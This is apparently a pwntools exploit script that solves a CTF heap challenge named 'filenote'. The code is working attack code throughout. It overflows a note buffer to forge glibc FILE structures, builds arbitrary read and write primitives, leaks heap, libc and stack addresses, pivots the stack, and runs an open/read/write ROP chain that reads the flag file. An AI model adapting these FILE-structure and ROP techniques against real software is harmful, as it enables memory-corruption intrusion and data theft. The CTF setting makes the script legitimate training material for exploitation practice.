from pwn import *

context.terminal = ['tmux', 'split', '-h']
context.arch = 'amd64'
context.binary = "./chal"
# context.log_level = 'debug'
is_remote = False

l = ELF("../libc.so.6")
lb = ELF("./chal")

if is_remote:
    server = process(['socat', 'tcp-listen:12346,reuseaddr,fork', 'exec:/pwnbox/pwn3/filenote_release/filenote/chal,nofork'])
    sleep(1)

def init_proc(is_remote=False):
    if is_remote:
        p = remote("localhost", 12346)
        sleep(1)
    else:
        p = remote("edu-ctf.zoolab.org", 30218)
        # p = process("./chal")
    return p

def leak_heap(p):
    p.sendlineafter(">", "1")
    p.sendlineafter(">", "2")

    payload = flat(
        0xfbad2486, 0,
        0, 0,
        0, 0,
        0, 0,
        0, 0,
        0, 0,
        0, 0,
        1,
        endianness='little',
        word_size=64,
        sign=False,
    )
    p.sendlineafter("data>", b'A'*0x210+payload)

    p.sendlineafter(">", "3")

    payload = flat(
        0xfbad1a00, 0,
        0, 0,
        endianness='little',
        word_size=64,
        sign=False,
    )
    p.sendlineafter("> ", "2")
    p.sendlineafter("data> ", b'A'*0x210+payload+b"\x00")
    p.sendlineafter("> ", "3")

def arbi_read(p, addr, len):
    print(f"arbitrary read {hex(addr)} ~ {hex(addr + len)}")
    payload = flat(
        0x0800, 0,
        addr, 0,
        addr, addr + len,
        0, 0,
        0, 0,
        0, 0,
        0, 0,
        1
    )
    p.sendlineafter(">", "2")
    p.sendlineafter("data>", b'A'*0x210+payload)
    p.sendlineafter("> ", "3")
    return p.recv(len)

def arbi_write(p, addr, val):
    print(f"arbitrary write {hex(addr)} = {val}")
    p.sendlineafter(">", "2")

    payload = flat(
        0x0800, 0,
        0, 0,
        addr, addr,
        addr + len(val), 0,
        0, 0,
        0, 0,
        0, 0,
        1
    )
    p.sendlineafter("data>", val + b'A'*(0x210-len(val))+payload)
    p.sendlineafter("> ", "3")

def raw2addr(ul):
    return int(ul[::-1].hex(), base=16)

try_count = 0

while True:
    print(f"leak heap try {try_count}")
    p = init_proc(is_remote)
    leak_heap(p)
    recv = p.recvuntil("----- FILE Note -----", drop=True)

    try_count += 1
    if len(recv) > 0:
        break
    else:
        p.close()

heap_addr = raw2addr(recv[0x4d0:0x4d8])
libc = raw2addr(arbi_read(p, heap_addr+0x588, 0x8)) - 0x1ed4a0
_IO_file_jumps = libc + l.sym['_IO_file_jumps']
__malloc_hook = libc + l.sym['__malloc_hook']
__libc_start_main = libc + l.sym['__libc_start_main']
print("__libc_start_main: ", hex(__libc_start_main))

# leak stack address
environ_addr = raw2addr(arbi_read(p, libc + l.symbols['environ'], 0x8))
stack_addr = raw2addr(arbi_read(p, environ_addr, 0x8)) + 0x717

search_target = b'\x00\x00'+bytes.fromhex(hex(libc + 0x270b3)[2:])
search_stack_cnt = 1

while True:
    print("-------")
    print(f"search {0x800*(search_stack_cnt-1)} ~ {0x800*search_stack_cnt}")
    stack_state = arbi_read(p, stack_addr - 0x800 * search_stack_cnt, 0x800)[::-1]
    print(stack_state, len(stack_state), search_target in stack_state)
    print("-------")

    if search_target in stack_state:
        print(f"find {hex(libc + 0x270b3)} in {search_stack_cnt}")
        __libc_start_main_stack_addr = stack_addr - (0x800 * (search_stack_cnt-1) + stack_state.find(search_target) + 0x8)
        break

    search_stack_cnt += 1

main_stack_addr = __libc_start_main_stack_addr+0x20
main_addr = raw2addr(arbi_read(p, main_stack_addr, 0x8))

print(hex(__libc_start_main_stack_addr), hex(main_addr))

# stack pivoting
note_buf_addr = heap_addr + 0x2a0
new_stack = note_buf_addr+0x300
save_note_ret_addr = __libc_start_main_stack_addr - 0x10
save_note_rbp_addr = __libc_start_main_stack_addr - 0x18
print(hex(save_note_ret_addr), hex(save_note_rbp_addr))

leave_ret_gadget = libc + 0x5aa48
pop_rax_ret_gadget = libc + 0x4a550
pop_rdi_ret_gadget = libc + 0x26b72
pop_rsi_ret_gadget = libc + 0x27529
pop_rax_pop_rdx_pop_rbx_ret_gadget = libc + 0x162865
syscall_ret_gadget = libc + 0x66229

flag_fn = b"/home/filenote/flag\x00"
flag_fn_addr = new_stack + 0x300
print("flag_fn_addr", hex(flag_fn_addr))
arbi_write(p, flag_fn_addr, flag_fn)

pop_rdi_ret = libc + 0x26b72
pop_rsi_ret = libc + 0x27529
pop_rax_ret = libc + 0x4a550
pop_rdx_rbx_ret = libc + 0x162866
syscall_ret = libc + 0x66229
leave_ret = libc + 0x5aa48
ret = libc + 0x25679

ROP = b"\x00"*8 + flat(
    pop_rdi_ret, flag_fn_addr,
    pop_rsi_ret, 0,
    pop_rax_ret, 2,
    syscall_ret,

    pop_rdi_ret, 4,
    pop_rsi_ret, flag_fn_addr,
    pop_rdx_rbx_ret, 0x30, 0x0,
    pop_rax_ret, 0,
    syscall_ret,

    pop_rdi_ret, 1,
    pop_rsi_ret, flag_fn_addr,
    pop_rdx_rbx_ret, 0x30, 0x0,
    pop_rax_ret, 1,
    syscall_ret,

    main_addr
)
arbi_write(p, new_stack, ROP)

print("leave_ret_gadget", hex(leave_ret_gadget))
print("new_stack", hex(new_stack))
# gdb.attach(p, """
# dir /usr/src/glibc/glibc-2.31/libio
# b save_note
# """)
arbi_write(p, save_note_rbp_addr, p64(new_stack)+p64(leave_ret_gadget))

print("FLAG: ", p.recv(0x30))

p.interactive()